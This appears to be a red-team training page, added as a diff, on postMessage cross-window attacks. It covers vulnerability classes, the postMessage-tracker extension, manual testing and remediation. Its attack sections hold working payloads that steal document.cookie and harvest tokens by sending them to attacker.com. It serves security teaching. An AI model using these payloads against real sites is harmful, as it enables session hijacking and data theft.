@@ -1,0 +1,259 @@
+---
+layout: training-page
+title: "postMessage Attacks & Cross-Window Messaging Vulnerabilities — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - postmessage
+  - cross-origin
+  - javascript
+  - dom
+  - xss
+  - web-attacks
+  - postmessage-tracker
+page_key: "web-postmessage"
+render_with_liquid: false
+---
+
+# postMessage Attacks & Cross-Window Messaging Vulnerabilities
+
+The `window.postMessage()` API allows cross-origin communication between a page and its iframes, popup windows, or parent frames. When receiving code doesn't validate the message origin, type, or content, attackers can send malicious messages from a different origin — bypassing the Same-Origin Policy and triggering XSS, privilege escalation, or data exfiltration depending on how the receiver handles the message payload.
+
+## How postMessage Works
+
+```
+// Sender (any origin):
+window.postMessage(data, targetOrigin);
+// targetOrigin = "*" means any origin — the sender sends to anyone
+// targetOrigin = "https://app.corp.com" restricts to that origin
+
+// Receiver (the vulnerable site):
+window.addEventListener("message", function(event) {
+  // VULNERABLE — no origin check:
+  eval(event.data);                  // code execution
+  document.innerHTML = event.data;   // XSS via innerHTML
+  fetch(event.data.url);             // SSRF via postMessage
+  location.href = event.data.url;    // open redirect
+
+  // SAFE — origin is validated:
+  if (event.origin !== "https://trusted.app.com") return;
+  // ... process event.data safely
+});
+```
+
+## Vulnerability Classes
+
+```
+# 1. Missing origin validation
+# Receiver accepts messages from any origin — attacker page can send arbitrary data
+
+# 2. Wildcard origin on sender (targetOrigin = "*")
+# Sender broadcasts to all frames — including cross-origin ones
+# If the message contains secrets (tokens, PII), they leak to any frame that listens
+
+# 3. Unsafe message handling
+# Receiver passes event.data directly to eval(), innerHTML, location.href, etc.
+# Even with origin check, a compromised trusted origin becomes a pivot point
+
+# 4. Message reflection / XSS
+# Receiver reflects event.data into the DOM without sanitization:
+document.getElementById("output").innerHTML = event.data;  // XSS if data is HTML
+
+# 5. postMessage → CSRF
+# Receiver performs state-changing actions on message receipt without CSRF token check
+# Attacker posts a message from their origin → receiver executes action
+```
+
+## Attack — Sending a Malicious postMessage
+
+```
+# Exploit a receiver that does:
+#   window.addEventListener("message", e => eval(e.data))
+
+# Attacker-controlled page — open target in iframe and send payload:
+<!-- attacker.html -->
+<iframe id="target" src="https://vulnerable.app/page"></iframe>
+<script>
+  var iframe = document.getElementById("target");
+  iframe.onload = function() {
+    // Send payload after page loads — no origin restriction (*)
+    iframe.contentWindow.postMessage(
+      "fetch('https://attacker.com/?c='+document.cookie)",
+      "*"
+    );
+  };
+</script>
+
+# If iframing is blocked (X-Frame-Options), use window.open instead:
+var w = window.open("https://vulnerable.app/page");
+setTimeout(function() {
+  w.postMessage("document.location='https://attacker.com/?c='+document.cookie", "*");
+}, 2000);   // wait for target to load
+```
+
+## Attack — Harvesting Secrets from Wildcard Sender
+
+```
+# Target sends auth tokens via postMessage with targetOrigin = "*":
+# parent_app.postMessage({ token: "eyJhbGci..." }, "*");
+# Any frame or window listening can receive this
+
+# Attacker listens from a cross-origin iframe:
+window.addEventListener("message", function(event) {
+  // Capture all postMessages — including tokens sent with wildcard origin
+  fetch("https://attacker.com/collect?origin=" +
+    encodeURIComponent(event.origin) +
+    "&data=" + encodeURIComponent(JSON.stringify(event.data)));
+});
+```
+
+## postMessage Tracker — Chrome Extension
+
+postMessage-tracker is a Chrome extension that monitors all postMessage events on the current page. It shows listener counts, logs all messages sent and received, tracks cross-frame communication, and can log to a remote URL for automated collection during recon.
+
+### Install
+
+```
+# Clone the repo:
+git clone https://github.com/fransr/postMessage-tracker
+cd postMessage-tracker
+
+# Load as unpacked extension in Chrome:
+# 1. Open chrome://extensions/
+# 2. Enable "Developer mode" (top right toggle)
+# 3. Click "Load unpacked"
+# 4. Select the postMessage-tracker directory
+# 5. The extension icon appears in the toolbar
+```
+
+### Using postMessage Tracker
+
+```
+# Navigate to any page in Chrome.
+# The extension badge shows the number of postMessage listeners registered on the page.
+# Example: badge shows "3" → 3 event listeners for the "message" event
+
+# Click the extension icon to see:
+# - Total listener count
+# - Each listener's function source code (what it does with messages)
+# - Messages sent/received in real time (if monitoring is active)
+
+# Cross-frame tracking:
+# The extension injects a content script that hooks addEventListener globally
+# It tracks listeners in iframes and child windows too — not just the top frame
+
+# Log URL feature:
+# Set a remote URL in the extension settings
+# All captured postMessage events are POSTed to that URL
+# Useful for passive collection while navigating multi-step apps
+
+# Workflow for recon on a target app:
+# 1. Load postMessage-tracker
+# 2. Navigate to the target page
+# 3. Check the badge — if non-zero, the app uses postMessage
+# 4. Click icon → read listener function source to understand what it accepts
+# 5. Look for: missing origin checks, eval(), innerHTML, location.href
+# 6. Craft a payload based on the listener's expected message format
+```
+
+### Reading Listener Source Code
+
+```
+# postMessage-tracker shows the raw source of each listener.
+# Analyze for vulnerability patterns:
+
+# Pattern 1 — no origin validation (always vulnerable):
+window.addEventListener("message", function(e) {
+  doSomething(e.data);   // no "if (e.origin !== ...)" check
+});
+
+# Pattern 2 — weak origin validation (bypassable):
+if (event.origin.indexOf("corp.com") > -1) {
+  // "attacker-corp.com" passes this check!
+}
+
+# Pattern 3 — JSON parsing (check for prototype pollution):
+var data = JSON.parse(event.data);
+obj[data.key] = data.value;   // prototype pollution if key = "__proto__"
+
+# Pattern 4 — postMessage → location change (open redirect / XSS):
+if (msg.type === "navigate") {
+  window.location = msg.url;    // can redirect to javascript: URI
+}
+```
+
+## Testing postMessage Manually with Browser Console
+
+```
+# From the browser console on your attack page, send messages to iframed targets:
+
+# Find the iframe:
+var target = document.querySelector("iframe").contentWindow;
+
+# Send a string payload:
+target.postMessage("test", "*");
+
+# Send a JSON payload (common message format):
+target.postMessage(JSON.stringify({ action: "navigate", url: "javascript:alert(1)" }), "*");
+
+# Send to a popup:
+var win = window.open("https://target.com");
+setTimeout(() => win.postMessage({ cmd: "exec", data: "fetch(...)" }, "*"), 2000);
+
+# Monitor responses — listen from the console:
+window.addEventListener("message", e => console.log(e.origin, e.data));
+```
+
+## Automated Discovery
+
+```
+# Use Burp Suite to find postMessage handlers in JavaScript:
+# 1. Browse the target app normally with Burp intercepting
+# 2. Search JS responses for "addEventListener" + "message":
+#    grep-equivalent in Burp: Search → "addEventListener.*message"
+
+# Grep JS files for listener patterns:
+# From your terminal after downloading JS files:
+grep -r "addEventListener" ./js/ | grep "message"
+grep -r "postMessage" ./js/
+
+# LinkFinder can find JS endpoints that may include postMessage handlers:
+python linkfinder.py -i https://target.com -d -o cli | grep -i message
+
+# Automated scan with DOMinator or similar DAST tools:
+# Some scanners (Burp Pro, Nuclei) have templates for postMessage issues
+```
+
+## Remediation
+
+```
+# Always validate event.origin:
+window.addEventListener("message", function(event) {
+  if (event.origin !== "https://trusted-origin.com") return;
+  // safe to process event.data now
+});
+
+# Never use wildcard targetOrigin when sending sensitive data:
+// WRONG:
+window.postMessage({ token: authToken }, "*");
+// CORRECT:
+window.postMessage({ token: authToken }, "https://specific-target.com");
+
+# Sanitize event.data before using in DOM:
+// WRONG:
+element.innerHTML = event.data;
+// CORRECT:
+element.textContent = event.data;   // or use DOMPurify
+
+# Validate message structure with a schema:
+if (typeof event.data !== "object" || !event.data.hasOwnProperty("type")) return;
+if (!["allowed_type1", "allowed_type2"].includes(event.data.type)) return;
+```
+
+## Resources
+
+- postMessage-tracker Chrome extension — `github.com/fransr/postMessage-tracker`
+- PortSwigger — postMessage vulnerabilities — `portswigger.net/web-security/dom-based/controlling-the-web-message-source`
+- MDN — window.postMessage — `developer.mozilla.org/en-US/docs/Web/API/Window/postMessage`
+- Related: [DOM Clobbering](/web/dom-clobbering/)
+- Related: [DNS Rebinding Attacks](/web/dns-rebinding/)
+- Related: [File Inclusion & Path Traversal](/web/file-inclusion/)
